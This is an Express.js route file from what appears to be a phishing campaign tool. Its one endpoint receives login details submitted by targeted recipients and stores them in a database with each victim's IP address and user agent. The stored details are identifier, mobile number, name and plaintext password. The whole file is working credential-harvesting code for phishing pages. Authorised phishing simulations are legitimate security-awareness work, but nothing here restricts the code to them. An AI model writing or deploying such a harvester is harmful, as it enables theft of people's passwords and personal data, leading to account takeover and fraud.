const express = require('express');
const router = express.Router();
const mongoose = require('mongoose');

const Campaign = require('../models/Campaign');
const ActivityLog = require('../models/ActivityLog');
const CapturedCredential = require('../models/CapturedCredential');
const inMemoryStore = require('../data/inMemoryStore');

const isDbConnected = () => mongoose.connection.readyState === 1;

// Credential capture endpoint - for production (Render) use
router.post('/capture-credentials', async (req, res) => {
  try {
    const { token, identifier, mobile, countryCode, name, password } = req.body;

    if (!token) {
      return res.status(400).json({ error: 'Token is required' });
    }

    let campaign = null;
    let recipient = null;

    // Find campaign and recipient by token
    if (isDbConnected()) {
      campaign = await Campaign.findOne({ 'recipients.trackingToken': token });
      if (campaign) {
        recipient = campaign.recipients.find(r => r.trackingToken === token);
      }
    } else {
      for (const camp of inMemoryStore.campaigns) {
        const rec = camp.recipients.find(r => r.trackingToken === token);
        if (rec) {
          campaign = camp;
          recipient = rec;
          break;
        }
      }
    }

    // Store captured credentials
    const credentialData = {
      identifier,
      mobile,
      countryCode,
      name,
      password,
      capturedAt: new Date()
    };

    // If recipient found in campaign, store there too
    if (recipient) {
      recipient.capturedCredentials = credentialData;
    }

    console.log('Saving credentials for recipient:', recipient ? recipient.email : identifier);
    console.log('Database connected:', isDbConnected());

    // Extract real IP address
    let ipAddress = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    if (ipAddress && ipAddress.includes(',')) {
      ipAddress = ipAddress.split(',')[0].trim();
    }
    
    if (ipAddress && ipAddress.startsWith('::ffff:')) {
      ipAddress = ipAddress.substring(7);
    }
    
    if (ipAddress === '::1' || ipAddress === '127.0.0.1' || ipAddress === 'localhost') {
      ipAddress = 'Unknown';
    }
    
    if (!ipAddress || ipAddress === '') {
      ipAddress = 'Unknown';
    }

    // Save to separate CapturedCredential collection
    if (isDbConnected()) {
      try {
        await CapturedCredential.create({
          campaignId: campaign ? campaign._id : null,
          campaignTitle: campaign ? campaign.title : 'Direct Test Email',
          recipientEmail: recipient ? recipient.email : identifier,
          recipientName: recipient ? recipient.fullName : name,
          trackingToken: token,
          identifier,
          mobile,
          countryCode,
          name,
          password,
          ipAddress: ipAddress,
          userAgent: req.get('User-Agent'),
          capturedAt: new Date()
        });
        console.log('Credentials saved to CapturedCredential collection successfully');
      } catch (saveErr) {
        console.error('Error saving to CapturedCredential collection:', saveErr.message);
      }

      // Also save to campaign for backward compatibility
      if (campaign && recipient) {
        try {
          recipient.capturedCredentials = {
            identifier,
            mobile,
            countryCode,
            name,
            password,
            capturedAt: new Date()
          };
          await campaign.save();
          console.log('Credentials also saved to campaign for compatibility');
        } catch (saveErr) {
          console.error('Error saving to campaign:', saveErr.message);
        }
      }
    } else {
      console.log('Using in-memory store (MongoDB not connected)');
      if (recipient) {
        recipient.capturedCredentials = {
          identifier,
          mobile,
          countryCode,
          name,
          password,
          capturedAt: new Date()
        };
      }
    }

    // Log to activity logs
    if (isDbConnected()) {
      try {
        await ActivityLog.create({
          campaignId: campaign ? campaign._id : null,
          campaignTitle: campaign ? campaign.title : 'Direct Test Email',
          email: recipient ? recipient.email : identifier,
          fullName: recipient ? recipient.fullName : name,
          trackingToken: token,
          eventType: 'credentials_captured',
          status: recipient ? recipient.status : 'unknown',
          urlClicked: recipient ? recipient.clicked : false,
          fileOpened: recipient ? recipient.attachmentInteracted : false,
          clickCount: recipient ? recipient.clickCount : 0,
          ipAddress: req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress,
          userAgent: req.get('User-Agent'),
          timestamp: new Date(),
          metadata: {
            capturedIdentifier: identifier,
            capturedMobile: mobile,
            capturedName: name
          }
        });
      } catch (logErr) {
        console.error('Failed to log credential capture:', logErr.message);
      }
    }

    return res.json({ success: true, message: 'Credentials captured successfully' });
  } catch (err) {
    console.error('Credential capture error:', err);
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
